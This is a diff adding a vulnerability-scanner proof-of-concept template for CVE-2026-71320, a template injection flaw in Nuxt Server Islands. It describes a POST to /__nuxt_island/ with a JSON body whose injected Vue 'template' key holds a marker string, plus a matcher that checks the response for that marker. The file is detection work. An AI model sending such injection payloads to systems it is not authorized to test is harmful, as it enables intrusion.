@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "检测Nuxt Server Islands运行时模板注入漏洞（CVE-2026-71320），通过向/__nuxt_island/端点发送包含恶意template键的JSON props，验证服务端是否执行攻击者控制的Vue模板代码"
+id = "POC-AVE-2026-1425"
+name = "CVE-2026-71320 PoC"
+severity = "high"
+tags = ["ave-2026-1425"]
+vuln_id = [
+    "CVE-2026-71320",
+    "AVE-2026-1425",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/__nuxt_island/"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"as":{"template":"<div>AVE_VULNERABLE_CVE_71320</div>"}}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVE_VULNERABLE_CVE_71320"]
